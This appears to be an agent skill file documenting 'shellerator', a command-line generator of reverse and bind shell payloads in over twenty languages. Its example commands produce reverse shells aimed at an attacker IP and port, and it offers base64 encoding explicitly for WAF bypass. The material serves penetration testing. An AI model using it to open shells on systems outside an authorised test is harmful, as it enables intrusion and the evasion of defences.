---
name: shellerator
description: "CLI reverse/bind shell generator supporting 20+ languages with optional encoding. Use when generating customized shell payloads for specific languages and encodings during exploitation."
license: MIT
compatibility: "Python 3; pip install shellerator; Linux/macOS/Windows; github.com/ShutdownRepo/shellerator"
metadata:
  author: AeonDave
  version: "1.0"
---

# Shellerator

CLI shell payload generator — reverse and bind shells for 20+ languages.

## Quick Start

```bash
pip install shellerator

# Interactive mode
shellerator

# Generate bash reverse shell
shellerator -t reverse -l bash --ip ATTACKER --port 4444

# Generate PowerShell bind shell
shellerator -t bind -l powershell --port 4444

# List all supported languages
shellerator --list
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-t TYPE` | `reverse` or `bind` |
| `-l LANG` | Shell language |
| `--ip IP` | Attacker IP (reverse) |
| `--port PORT` | Port |
| `-e ENCODING` | Encoding (base64, url, etc.) |
| `--list` | List supported languages |

## Supported Languages (examples)

`bash` · `sh` · `python` · `python3` · `perl` · `php` · `ruby` · `powershell` · `netcat` · `java` · `groovy` · `golang` · `lua` · `nodejs` · `socat` · `awk`

## Common Workflows

**Quick payload for exploit:**
```bash
shellerator -t reverse -l python3 --ip 10.10.14.5 --port 4444
```

**Base64-encoded for WAF bypass:**
```bash
shellerator -t reverse -l bash --ip 10.10.14.5 --port 4444 -e base64
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Language selection and encoding tips |
